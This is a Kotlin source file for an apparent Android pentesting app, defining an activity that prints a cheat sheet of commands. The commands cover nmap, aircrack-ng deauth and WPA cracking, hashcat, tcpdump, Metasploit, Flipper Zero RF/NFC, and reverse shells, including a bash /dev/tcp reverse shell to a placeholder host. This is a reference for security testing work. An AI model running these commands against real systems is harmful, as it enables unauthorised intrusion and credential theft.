package com.android.pen15.ui.utilities

import android.os.Bundle
import com.android.pen15.R
import com.android.pen15.ui.base.BaseToolActivity

class CheatSheetActivity : BaseToolActivity() {

    override fun getToolName() = "Pentesting Cheat Sheet"
    override fun getLayoutResource() = R.layout.activity_generic_tool
    override fun onToolExecute() { showCheatSheet() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        logMessage("Pentesting Cheat Sheet", includeTimestamp = false)
        logMessage("Quick reference for common commands", includeTimestamp = false)
        logMessage("")
        logMessage("Click Execute to view categories", includeTimestamp = false)
    }

    private fun showCheatSheet() {
        clearOutput()

        logMessage("=== PENTESTING CHEAT SHEET ===", includeTimestamp = false)
        logMessage("")

        logMessage("--- NMAP ---", includeTimestamp = false)
        logMessage("nmap -sn 192.168.1.0/24         # Ping scan", includeTimestamp = false)
        logMessage("nmap -p- -A 192.168.1.1         # Full port scan", includeTimestamp = false)
        logMessage("nmap -sV -sC 192.168.1.1        # Version + scripts", includeTimestamp = false)
        logMessage("nmap -p 80,443 --script http-*  # HTTP scripts", includeTimestamp = false)
        logMessage("")

        logMessage("--- AIRCRACK-NG ---", includeTimestamp = false)
        logMessage("airmon-ng start wlan0           # Enable monitor", includeTimestamp = false)
        logMessage("airodump-ng wlan0mon            # Scan networks", includeTimestamp = false)
        logMessage("airodump-ng -c 6 --bssid XX wlan0mon -w cap", includeTimestamp = false)
        logMessage("aireplay-ng --deauth 10 -a XX wlan0mon", includeTimestamp = false)
        logMessage("aircrack-ng -w wordlist cap.cap # Crack", includeTimestamp = false)
        logMessage("")

        logMessage("--- HASHCAT ---", includeTimestamp = false)
        logMessage("hashcat -m 0 hash.txt wordlist  # MD5", includeTimestamp = false)
        logMessage("hashcat -m 1000 hash.txt wordlist # NTLM", includeTimestamp = false)
        logMessage("hashcat -m 1400 hash.txt wordlist # SHA256", includeTimestamp = false)
        logMessage("hashcat -m 2500 cap.hccapx wordlist # WPA", includeTimestamp = false)
        logMessage("")

        logMessage("--- TCPDUMP ---", includeTimestamp = false)
        logMessage("tcpdump -i wlan0 -w cap.pcap    # Capture", includeTimestamp = false)
        logMessage("tcpdump -r cap.pcap             # Read", includeTimestamp = false)
        logMessage("tcpdump -i wlan0 'port 80'      # Filter HTTP", includeTimestamp = false)
        logMessage("")

        logMessage("--- METASPLOIT ---", includeTimestamp = false)
        logMessage("msfconsole                      # Start", includeTimestamp = false)
        logMessage("search exploit                  # Search", includeTimestamp = false)
        logMessage("use exploit/...                 # Select", includeTimestamp = false)
        logMessage("set LHOST 192.168.1.100        # Config", includeTimestamp = false)
        logMessage("exploit                         # Run", includeTimestamp = false)
        logMessage("")

        logMessage("--- REVERSE SHELLS ---", includeTimestamp = false)
        logMessage("Bash:", includeTimestamp = false)
        logMessage("bash -i >& /dev/tcp/IP/PORT 0>&1", includeTimestamp = false)
        logMessage("")
        logMessage("Python:", includeTimestamp = false)
        logMessage("python -c 'import socket,subprocess,os;...'", includeTimestamp = false)
        logMessage("")
        logMessage("NC Listener:", includeTimestamp = false)
        logMessage("nc -lvnp 4444                   # Listen", includeTimestamp = false)
        logMessage("")

        logMessage("--- FLIPPER ZERO ---", includeTimestamp = false)
        logMessage("subghz rx 433.92                # Receive RF", includeTimestamp = false)
        logMessage("subghz tx /ext/signal.sub       # Transmit", includeTimestamp = false)
        logMessage("nfc detect                      # NFC scan", includeTimestamp = false)
        logMessage("rfid read                       # RFID read", includeTimestamp = false)
        logMessage("gpio set 0 1                    # GPIO high", includeTimestamp = false)
        logMessage("")

        logMessage("--- More Resources ---", includeTimestamp = false)
        logMessage("https://github.com/swisskyrepo/PayloadsAllTheThings", includeTimestamp = false)
        logMessage("https://pentestmonkey.net/cheat-sheet", includeTimestamp = false)
        logMessage("https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/", includeTimestamp = false)
    }
}
